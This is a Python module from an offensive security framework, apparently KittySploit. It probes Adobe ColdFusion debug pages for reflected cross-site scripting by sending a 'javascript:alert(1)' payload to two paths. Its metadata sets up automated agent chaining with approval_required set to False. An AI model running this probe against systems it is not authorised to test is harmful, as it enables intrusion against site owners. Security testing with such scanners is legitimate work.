#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Adobe ColdFusion debug page contains a cross-site scripting vulnerability when the application is running on a."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Adobe ColdFusion - Cross-Site Scripting Detection',
        'description': 'Adobe ColdFusion debug page contains a cross-site scripting vulnerability when the application is running on a remote host. An attacker can execute arbitrary script in the browser of an unsuspecting user in the context of the affected site. This can allow the attacker to steal cookie-based authentication credentials and launch other attacks.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'adobe', 'coldfusion', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/jaeles-project/jaeles-signatures/blob/master/common/coldfusion-debug-xss.yaml',
        ],
    }

    def run(self):
        for path in ('/CFIDE/debug/cf_debugFr.cfm?userPage=javascript:alert(1)', '/cfusion/debug/cf_debugFr.cfm?userPage=javascript:alert(1)'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 200:
                continue
            body = r.text or ""
            headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
            body_any = ('"cf_main_cf" src="javascript:alert(1)"',)
            header_any = ('text/html',)
            if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
                self.set_info(
                    severity='high',
                    reason="Adobe ColdFusion - Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

